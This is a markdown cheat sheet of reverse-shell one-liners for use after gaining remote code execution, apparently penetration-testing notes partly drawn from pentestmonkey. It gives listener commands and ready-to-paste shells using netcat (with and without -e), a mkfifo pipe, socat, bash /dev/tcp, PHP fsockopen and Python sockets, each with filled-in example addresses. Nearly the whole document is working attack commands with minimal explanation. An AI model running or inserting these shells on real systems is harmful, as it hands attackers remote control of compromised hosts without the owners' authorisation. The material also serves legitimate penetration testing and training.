# Reverse Shells

Often during the course of an attack, you may gain RCE, and using it you may want to gain a shell. This is often achieved using a reverse shell

## Netcat

### Setting A Listener

    nc -nvlp [Port]

#### Params

    [Port]: The port to listen for a connection on 

#### Examples

    nc -nlvp 4444

### With -e

Newer versions have a nice option `-e` which allows binding of a process to an nc connection

    nc -e /bin/sh [IP] [Port]

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    nc -e /bin/sh 192.168.56.101 4444

### Without -e

Older versions of nc don't have the nice `-e` option, so it has to be done slightly differently

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [Port] >/tmp/f

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 4444 >/tmp/f

## Socat

### Setting A Listener

    socat file:`tty`,raw,echo=0 tcp-listen:[Port]

#### Params

    [Port]: The port to listen for a connection on 

#### Examples

    socat file:`tty`,raw,echo=0 tcp-listen:4444

### Simple Full tty

    socat tcp-connect:[IP]:[Port] exec:"bash -li",pty,stderr,setsid,sigint,sane

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    socat tcp-connect:192.168.54.65:6666 exec:"bash -li",pty,stderr,setsid,sigint,sane

## Bash

### Simple Bash Shell

    bash -i >& /dev/tcp/[IP]/[Port] 0>&1

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    bash -i >& /dev/tcp/192.168.56.101/4444 0>&1

### Alternative

    echo 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1' | bash

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    echo 'bash -i >& /dev/tcp/192.168.212.5/1234 0>&1' | bash

## PHP

### Simple Shell

    php -r '$sock=fsockopen("[IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
    
#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    php -r '$sock=fsockopen("192.168.54.98",8888);exec("/bin/sh -i <&3 >&3 2>&3");'

## Python

### Standard Reverse Shell

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*